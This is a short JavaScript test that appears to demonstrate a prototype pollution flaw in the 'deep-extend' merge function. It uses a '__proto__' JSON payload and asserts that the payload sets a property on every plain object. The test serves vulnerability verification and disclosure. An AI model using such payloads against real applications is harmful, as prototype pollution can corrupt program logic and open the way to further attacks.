test("prototype pollution in merge-objects", () => {
  const merge = require("deep-extend");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe("yes");
});
